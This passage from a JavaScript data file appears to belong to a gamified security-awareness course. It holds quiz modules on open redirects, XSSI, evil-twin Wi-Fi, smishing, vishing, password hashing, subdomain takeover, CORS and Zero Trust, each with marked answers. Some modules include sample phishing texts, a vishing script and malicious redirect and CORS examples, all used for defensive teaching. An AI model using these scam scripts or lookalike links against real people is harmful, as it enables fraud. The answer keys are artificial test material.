            feedback: "Wrong! Adding memory without throttling only delays server crash during heavy attacks."
          },
          {
            label: "Disable error logging to save disk bandwidth",
            correct: false,
            feedback: "Incorrect. Disabling logging impairs incident investigation without stopping request floods."
          }
        ]
      }
    ]
  },
  {
    id: 32,
    title: "Open Redirect Vulnerability",
    difficulty: "Beginner",
    time: "3 mins",
    xp: 130,
    icon: "share-2",
    goal: "Recognize how unvalidated redirect parameters can be used in phishing campaigns.",
    summary: "Open redirect occurs when a web application accepts a user-controlled parameter specifying a redirection URL without validating its domain destination.",
    tips: [
      "Use relative redirect paths instead of absolute URLs where possible.",
      "Validate redirection targets against a trusted domain whitelist.",
      "Warn users when redirecting to external sites."
    ],
    steps: [
      {
        id: 1,
        title: "Redirect Link Inspection",
        description: "You click a link: `https://trusted-bank.com/login?redirect=http://evil-site.com`",
        leftWindowHtml: `
          <div class="p-4 bg-slate-900 h-full rounded flex flex-col font-sans text-slate-200">
            <div class="bg-slate-950 p-3 rounded border border-slate-800 text-xs font-mono">
              <span class="text-slate-300">Target:</span> <span class="text-amber-400">https://trusted-bank.com/login?next=http://evil-phish.com</span>
            </div>
          </div>
        `,
        rightWindowHtml: `
          <div class="p-4 h-full flex flex-col justify-between font-mono text-xs">
            <div class="space-y-4">
              <div class="text-cyan-400 border-b border-cyan-900/50 pb-2">REDIRECT FLOW</div>
              <div class="bg-slate-950 p-3 rounded border border-slate-850 text-[10px] space-y-1">
                <div class="text-red-400 font-bold">Phishing Link Masking</div>
                <p class="text-slate-400">User trusts domain 'trusted-bank.com', but is silently redirected to 'evil-phish.com'.</p>
              </div>
            </div>
          </div>
        `,
        choices: [
          {
            label: "Enforce domain whitelist validation on all redirection parameters",
            correct: true,
            feedback: "Perfect! Whitelisting redirect targets prevents attacker-controlled external redirects.",
            xpReward: 130
          },
          {
            label: "Allow any HTTP redirect as long as it starts with http",
            correct: false,
            feedback: "Wrong! Allowing arbitrary external HTTP targets enables open redirect exploitation."
          },
          {
            label: "Base64 encode the destination URL parameter",
            correct: false,
            feedback: "Incorrect. Base64 encoding hides text from casual inspection but doesn't prevent server redirection."
          }
        ]
      }
    ]
  },
  {
    id: 33,
    title: "Cross-Site Script Inclusion (XSSI)",
    difficulty: "Intermediate",
    time: "4 mins",
    xp: 180,
    icon: "code-2",
    goal: "Understand how dynamic JavaScript files can leak sensitive JSON data.",
    summary: "XSSI occurs when sensitive data is exposed inside executable JavaScript files or JSON response formats that can be included by third-party sites using `<script>` tags.",
    tips: [
      "Use `JSON.parse` with HTTP POST requests for sensitive data APIs.",
      "Include anti-parser prefixes like `)]}'` in raw JSON responses.",
      "Set `X-Content-Type-Options: nosniff` header."
    ],
    steps: [
      {
        id: 1,
        title: "Dynamic Script Data Endpoint",
        description: "An application returns user profile data as a executable script: `user_data.js`",
        leftWindowHtml: `
          <div class="p-4 bg-slate-900 h-full rounded flex flex-col font-sans text-slate-200">
            <div class="bg-slate-950 p-3 rounded border border-slate-800 font-mono text-xs text-amber-400">
              &lt;script src="https://bank.com/api/user_info.js"&gt;&lt;/script&gt;
            </div>
          </div>
        `,
        rightWindowHtml: `
          <div class="p-4 h-full flex flex-col justify-between font-mono text-xs">
            <div class="space-y-4">
              <div class="text-cyan-400 border-b border-cyan-900/50 pb-2">DATA LEAK ENGINE</div>
              <div class="bg-slate-950 p-3 rounded border border-slate-850 text-[10px] space-y-1">
                <div class="text-red-400 font-bold">Cross-Origin Execution</div>
                <p class="text-slate-400">Attacker site overrides array prototypes to steal data loaded via script tags.</p>
              </div>
            </div>
          </div>
        `,
        choices: [
          {
            label: "Serve data strictly as JSON with Content-Type: application/json and require POST with CSRF tokens",
            correct: true,
            feedback: "Excellent! Serving non-executable JSON via POST prevents script tag inclusion attacks.",
            xpReward: 180
          },
          {
            label: "Change file extension from .js to .txt without changing headers",
            correct: false,
            feedback: "Wrong! Browsers can still parse files as JS if MIME sniffing occurs."
          },
          {
            label: "Allow cross-origin script inclusion for all domains",
            correct: false,
            feedback: "Incorrect. Granting global access increases data leakage risk."
          }
        ]
      }
    ]
  },
  {
    id: 34,
    title: "Wi-Fi Evil Twin Access Point",
    difficulty: "Beginner",
    time: "3 mins",
    xp: 140,
    icon: "wifi",
    goal: "Learn how rogue Wi-Fi access points mimic legitimate public networks.",
    summary: "An Evil Twin is a rogue Wi-Fi access point that broadcasts the exact SSID as a legitimate public network (e.g. 'Airport_Free_WiFi') to intercept victim traffic.",
    tips: [
      "Avoid connecting to open, unencrypted public Wi-Fi networks.",
      "Use a reputable VPN (Virtual Private Network) to encrypt all traffic.",
      "Disable 'Auto-Connect to Open Wi-Fi' on mobile devices."
    ],
    steps: [
      {
        id: 1,
        title: "Duplicate Wi-Fi SSIDs",
        description: "Your Wi-Fi list displays two identical network names: 'Airport_Guest_WiFi'.",
        leftWindowHtml: `
          <div class="p-4 bg-slate-900 h-full rounded flex flex-col font-sans text-slate-200">
            <div class="bg-slate-950 p-3 rounded border border-slate-800 text-xs space-y-2">
              <div class="font-bold text-white">Available Wi-Fi Networks:</div>
              <div class="p-2 bg-slate-900 rounded border border-slate-700 flex justify-between">
                <span>Airport_Guest_WiFi (Open)</span>
                <span class="text-emerald-400 font-bold">Signal: Strong</span>
              </div>
              <div class="p-2 bg-slate-900 rounded border border-slate-700 flex justify-between">
                <span>Airport_Guest_WiFi (Open)</span>
                <span class="text-amber-400 font-bold">Signal: Strong</span>
              </div>
            </div>
          </div>
        `,
        rightWindowHtml: `
          <div class="p-4 h-full flex flex-col justify-between font-mono text-xs">
            <div class="space-y-4">
              <div class="text-cyan-400 border-b border-cyan-900/50 pb-2">ROGUE AP AUDIT</div>
              <div class="bg-slate-950 p-3 rounded border border-slate-850 text-[10px] space-y-1">
                <div class="text-red-400 font-bold">Rogue AP Detected!</div>
                <p class="text-slate-400">One of the access points is an attacker device capturing DNS queries.</p>
              </div>
            </div>
          </div>
        `,
        choices: [
          {
            label: "Avoid connecting to open Wi-Fi or turn on a trusted VPN before accessing accounts",
            correct: true,
            feedback: "Perfect! Using cellular data or an encrypted VPN tunnel protects traffic from rogue access points.",
            xpReward: 140
          },
          {
            label: "Connect to whichever network has full signal bars",
            correct: false,
            feedback: "Wrong! Attackers intentionally boost transmitter power so their rogue AP has the strongest signal."
          },
          {
            label: "Disable firewall while connected to public Wi-Fi",
            correct: false,
            feedback: "Incorrect. Disabling your firewall exposes your device to inbound network probes."
          }
        ]
      }
    ]
  },
  {
    id: 35,
    title: "Smishing (SMS Phishing & Package Scam)",
    difficulty: "Beginner",
    time: "3 mins",
    xp: 130,
    icon: "message-square",
    goal: "Spot fraudulent SMS text messages claiming failed postal deliveries.",
    summary: "Smishing uses SMS text messages with fake tracking links (e.g. 'USPS: Package delayed, update address at link...') to steal credit cards or credentials.",
    tips: [
      "Never click links sent via unsolicited SMS text messages.",
      "Check tracking numbers directly on official courier websites.",
      "Report spam texts to your carrier (e.g. forward to 7726)."
    ],
    steps: [
      {
        id: 1,
        title: "SMS Delivery Text Message",
        description: "You receive an SMS text message about a pending delivery.",
        leftWindowHtml: `
          <div class="p-4 bg-slate-900 h-full rounded flex flex-col font-sans text-slate-200">
            <div class="bg-slate-950 p-3 rounded border border-slate-800 text-xs space-y-2">
              <div class="text-slate-400 text-[10px]">SMS from +1 (800) 555-0144:</div>
              <p class="text-slate-200">"USPS: Your package delivery is on hold due to missing address details. Update now: <span class="text-cyan-400 underline">usps-delivery-status-track.info/update</span>"</p>
            </div>
          </div>
        `,
        rightWindowHtml: `
          <div class="p-4 h-full flex flex-col justify-between font-mono text-xs">
            <div class="space-y-4">
              <div class="text-cyan-400 border-b border-cyan-900/50 pb-2">SMS ANALYSIS</div>
              <div class="bg-slate-950 p-3 rounded border border-slate-850 text-[10px] space-y-1">
                <div class="text-amber-400 font-bold">Fake Domain:</div>
                <p class="text-slate-400">Official domain is usps.com, not usps-delivery-status-track.info.</p>
              </div>
            </div>
          </div>
        `,
        choices: [
          {
            label: "Delete the text message and verify tracking on the official website directly",
            correct: true,
            feedback: "Excellent! Navigating directly to official sites avoids fraudulent SMS phishing links.",
            xpReward: 130
          },
          {
            label: "Click the link and fill out credit card info to pay the $1 redelivery fee",
            correct: false,
            feedback: "Wrong! This is a smishing scam designed to harvest credit card details."
          },
          {
            label: "Reply STOP to test if the sender is real",
            correct: false,
            feedback: "Incorrect. Replying to spam confirms your mobile number is active and monitored."
          }
        ]
      }
    ]
  },
  {
    id: 36,
    title: "Vishing & AI Voice Cloning Scam",
    difficulty: "Intermediate",
    time: "4 mins",
    xp: 170,
    icon: "phone-call",
    goal: "Recognize voice phishing (vishing) and deepfake AI voice impersonations.",
    summary: "Attackers use voice cloning AI or phone spoofing to impersonate relatives, bank agents, or law enforcement, demanding urgent wire transfers or passcodes.",
    tips: [
      "Establish a family emergency safe word / code phrase.",
      "Hang up and call back using official, verified phone numbers.",
      "Never share OTP codes or passwords over phone calls."
    ],
    steps: [
      {
        id: 1,
        title: "Urgent Phone Call",
        description: "You receive a phone call claiming to be your bank's fraud department.",
        leftWindowHtml: `
          <div class="p-4 bg-slate-900 h-full rounded flex flex-col font-sans text-slate-200">
            <div class="bg-slate-950 p-4 rounded border border-slate-800 text-center space-y-2">
              <div class="text-cyan-400 font-bold text-sm">INCOMING CALL...</div>
              <div class="text-xs text-slate-300">Caller ID: Chase Bank Support</div>
              <p class="text-[11px] text-amber-400">"We detected fraud on your account. Read me the 6-digit code sent to your phone to block it."</p>
            </div>
          </div>
        `,
        rightWindowHtml: `
          <div class="p-4 h-full flex flex-col justify-between font-mono text-xs">
            <div class="space-y-4">
              <div class="text-cyan-400 border-b border-cyan-900/50 pb-2">CALL AUDIT</div>
              <div class="bg-slate-950 p-3 rounded border border-slate-850 text-[10px] space-y-1">
                <div class="text-red-400 font-bold">Caller ID Spoofing</div>
                <p class="text-slate-400">Attacker is attempting to trigger a password reset OTP and have you read it aloud.</p>
              </div>
            </div>
          </div>
        `,
        choices: [
          {
            label: "Hang up immediately and call the official support number on the back of your card",
            correct: true,
            feedback: "Perfect! Hanging up and calling back on an official number stops caller ID spoofing attacks.",
            xpReward: 170
          },
          {
            label: "Read the 6-digit OTP code to the caller to secure your account",
            correct: false,
            feedback: "Wrong! Banks will NEVER ask you to read your 2FA security passcode aloud."
          },
          {
            label: "Ask the caller to confirm your home address before giving the code",
            correct: false,
            feedback: "Incorrect. Scammers often have leaked address data from data breaches."
          }
        ]
      }
    ]
  },
  {
    id: 37,
    title: "Password Hashing & Salt Defense",
    difficulty: "Intermediate",
    time: "4 mins",
    xp: 180,
    icon: "lock",
    goal: "Learn why salted passwords with slow hash functions (Bcrypt/Argon2) stop rainbow table attacks.",
    summary: "Storing plain text passwords or using fast algorithms (MD5/SHA1) allows rapid offline cracking. Using salted, memory-hard hashes (Argon2id/Bcrypt) protects stored credentials.",
    tips: [
      "Never store plain text passwords in databases.",
      "Use modern adaptive hashing algorithms like Bcrypt, PBKDF2, or Argon2id.",
      "Use a unique cryptographic salt per user password."
    ],
    steps: [
      {
        id: 1,
        title: "Database Password Hash Storage",
        description: "Compare fast vs slow hashing implementations in database design.",
        leftWindowHtml: `
          <div class="p-4 bg-slate-900 h-full rounded flex flex-col font-sans text-slate-200">
            <div class="bg-slate-950 p-3 rounded border border-slate-800 text-xs font-mono space-y-2">
              <div class="text-red-400">Vulnerable: MD5("password123") = 482c811da5d5b...</div>
              <div class="text-emerald-400">Secure: bcrypt.hash("password123", saltRounds=12)</div>
            </div>
          </div>
        `,
        rightWindowHtml: `
          <div class="p-4 h-full flex flex-col justify-between font-mono text-xs">
            <div class="space-y-4">
              <div class="text-cyan-400 border-b border-cyan-900/50 pb-2">CRACKING BENCHMARK</div>
              <div class="bg-slate-950 p-3 rounded border border-slate-850 text-[10px] space-y-1">
                <div>MD5 speed: <span class="text-red-400">10 Billion hashes/sec</span></div>
                <div>Bcrypt speed: <span class="text-emerald-400">1,000 hashes/sec</span></div>
              </div>
            </div>
          </div>
        `,
        choices: [
          {
            label: "Implement Bcrypt / Argon2id with unique salt per user",
            correct: true,
            feedback: "Correct! Slow, salted hashing algorithms defeat rainbow tables and GPU cracking rigs.",
            xpReward: 180
          },
          {
            label: "Use single MD5 hash without salt for performance",
            correct: false,
            feedback: "Wrong! MD5 can be cracked in seconds using precomputed rainbow tables."
          },
          {
            label: "Encrypt passwords using a single static key stored in frontend JS",
            correct: false,
            feedback: "Incorrect. Static keys in client-side JS can easily be extracted by attackers."
          }
        ]
      }
    ]
  },
  {
    id: 38,
    title: "Subdomain Takeover Awareness",
    difficulty: "Advanced",
    time: "4 mins",
    xp: 210,
    icon: "server",
    goal: "Understand how abandoned DNS CNAME records lead to subdomain hijacking.",
    summary: "Subdomain takeover occurs when a DNS record (CNAME) points to a decommissioned external cloud service (GitHub Pages, AWS S3) that an attacker can re-register.",
    tips: [
      "Audit DNS records regularly for orphaned CNAME entries.",
      "Remove CNAME pointers immediately when decommissioning cloud assets.",
      "Use automated domain inventory monitoring tools."
    ],
    steps: [
      {
        id: 1,
        title: "Orphaned CNAME Record Audit",
        description: "`sub.company.com` points to `company-app.s3-website.amazonaws.com` (Bucket Deleted).",
        leftWindowHtml: `
          <div class="p-4 bg-slate-900 h-full rounded flex flex-col font-sans text-slate-200">
            <div class="bg-slate-950 p-3 rounded border border-slate-800 font-mono text-xs space-y-2">
              <div class="text-cyan-400">DNS Record: sub.company.com CNAME -&gt; legacy-bucket.s3.amazonaws.com</div>
              <div class="text-red-400 text-[10px]">S3 Status: 404 NoSuchBucket</div>
            </div>
          </div>
        `,
        rightWindowHtml: `
          <div class="p-4 h-full flex flex-col justify-between font-mono text-xs">
            <div class="space-y-4">
              <div class="text-cyan-400 border-b border-cyan-900/50 pb-2">TAKEOVER EXPLOIT</div>
              <div class="bg-slate-950 p-3 rounded border border-slate-850 text-[10px] space-y-1">
                <div class="text-red-400 font-bold">Attacker Action:</div>
                <p class="text-slate-400">Attacker creates 'legacy-bucket' S3 bucket and hosts phishing content under official sub.company.com domain.</p>
              </div>
            </div>
          </div>
        `,
        choices: [
          {
            label: "Remove stale DNS CNAME record immediately when deleting cloud resources",
            correct: true,
            feedback: "Perfect! Cleaning up DNS entries prevents attackers from claiming orphaned cloud subdomains.",
            xpReward: 210
          },
          {
            label: "Leave CNAME intact so users see a 404 page",
            correct: false,
            feedback: "Wrong! Leaving orphaned CNAMEs allows attackers to claim the backend bucket name."
          },
          {
            label: "Redirect all 404 errors to an external ad network",
            correct: false,
            feedback: "Incorrect. Redirecting to untrusted ad networks exposes users to malvertising."
          }
        ]
      }
    ]
  },
  {
    id: 39,
    title: "CORS Misconfiguration Defense",
    difficulty: "Advanced",
    time: "4 mins",
    xp: 220,
    icon: "shield-alert",
    goal: "Learn how overly permissive CORS headers allow cross-origin data theft.",
    summary: "Configuring `Access-Control-Allow-Origin: *` combined with `Access-Control-Allow-Credentials: true` allows malicious sites to make authenticated requests and read private user data.",
    tips: [
      "Never reflect arbitrary `Origin` headers when `Allow-Credentials` is enabled.",
      "Use explicit whitelists for allowed cross-origin domains.",
      "Avoid wildcard `*` settings on sensitive API endpoints."
    ],
    steps: [
      {
        id: 1,
        title: "CORS Header Audit",
        description: "An API returns: `Access-Control-Allow-Origin: https://attacker.com` & `Credentials: true`.",
        leftWindowHtml: `
          <div class="p-4 bg-slate-900 h-full rounded flex flex-col font-sans text-slate-200">
            <div class="bg-slate-950 p-3 rounded border border-slate-850 font-mono text-xs space-y-1">
              <div class="text-slate-400">HTTP/1.1 200 OK</div>
              <div class="text-red-400">Access-Control-Allow-Origin: https://malicious-site.com</div>
              <div class="text-red-400">Access-Control-Allow-Credentials: true</div>
            </div>
          </div>
        `,
        rightWindowHtml: `
          <div class="p-4 h-full flex flex-col justify-between font-mono text-xs">
            <div class="space-y-4">
              <div class="text-cyan-400 border-b border-cyan-900/50 pb-2">CORS LEAK MONITOR</div>
              <div class="bg-slate-950 p-3 rounded border border-slate-850 text-[10px] space-y-1">
                <div class="text-red-400 font-bold">Cross-Origin Access Granted!</div>
                <p class="text-slate-400">Malicious origin can fetch private user API payloads with cookies.</p>
              </div>
            </div>
          </div>
        `,
        choices: [
          {
            label: "Restrict Access-Control-Allow-Origin to strictly validated trusted origins only",
            correct: true,
            feedback: "Correct! Strict domain whitelisting prevents malicious cross-origin data extraction.",
            xpReward: 220
          },
          {
            label: "Reflect the incoming request Origin header automatically to fix CORS errors",
            correct: false,
            feedback: "Wrong! Dynamically reflecting the Origin header with credentials enabled creates a critical security hole."
          },
          {
            label: "Disable HTTPS on API subdomains",
            correct: false,
            feedback: "Incorrect. Disabling HTTPS exposes data in transit without resolving CORS misconfigurations."
          }
        ]
      }
    ]
  },
  {
    id: 40,
    title: "Zero Trust Architecture Master Challenge",
    difficulty: "Advanced",
    time: "5 mins",
    xp: 300,
    icon: "shield-check",
    goal: "Master the principles of Zero Trust: 'Never Trust, Always Verify'.",
    summary: "Zero Trust assumes threats exist inside and outside network perimeters. It enforces strict identity verification, micro-segmentation, and least-privilege access across all systems.",
    tips: [
      "Enforce explicit authentication and authorization for every request.",
      "Implement micro-segmentation to limit blast radius.",
      "Assume breach and continuously monitor user and device telemetry."
    ],
    steps: [
      {
        id: 1,
        title: "Enterprise Perimeter Review",
        description: "Select the architectural model that adheres strictly to Zero Trust principles.",
        leftWindowHtml: `
          <div class="p-4 bg-slate-900 h-full rounded flex flex-col font-sans text-slate-200">
            <div class="bg-slate-950 p-3 rounded border border-slate-850 font-mono text-xs space-y-2">
              <div class="text-cyan-400">// Architecture Audit Matrix</div>
              <div class="text-slate-300">Model A: Implicit trust inside corporate VPN</div>
              <div class="text-emerald-400 font-bold">Model B: Continuous Auth + Micro-segmentation + Least Privilege</div>
            </div>
          </div>
        `,
        rightWindowHtml: `
          <div class="p-4 h-full flex flex-col justify-between font-mono text-xs">
            <div class="space-y-4">
              <div class="text-cyan-400 border-b border-cyan-900/50 pb-2">ACADEMY MASTER SCORE</div>
              <div class="bg-slate-950 p-4 rounded border border-slate-850 text-center">
                <div class="text-cyberSecondary text-2xl font-bold font-mono">40 / 40</div>
                <div class="text-[10px] text-slate-400 mt-1">Full Security Curriculum Complete!</div>
              </div>
            </div>
          </div>
        `,
        choices: [
          {
            label: "Enforce Model B: Continuous Identity Verification, Least Privilege, and Micro-segmentation",
            correct: true,
            feedback: "CONGRATULATIONS! You have mastered all 40 simulation nodes in CyberGuard Academy!",
            xpReward: 300
          },
          {
            label: "Trust all devices connected inside the internal office LAN",
            correct: false,
            feedback: "Wrong! Implicit trust inside the internal network allows compromised devices to pivot freely."
          },
          {
            label: "Disable multi-factor authentication for internal intranet apps",
            correct: false,
            feedback: "Incorrect. Zero Trust requires MFA and continuous authentication regardless of network location."
          }
        ]
      }
    ]
  }
];

if (typeof module !== 'undefined' && module.exports) {
  module.exports = simulationsData;
} else {
  window.simulationsData = simulationsData;
}
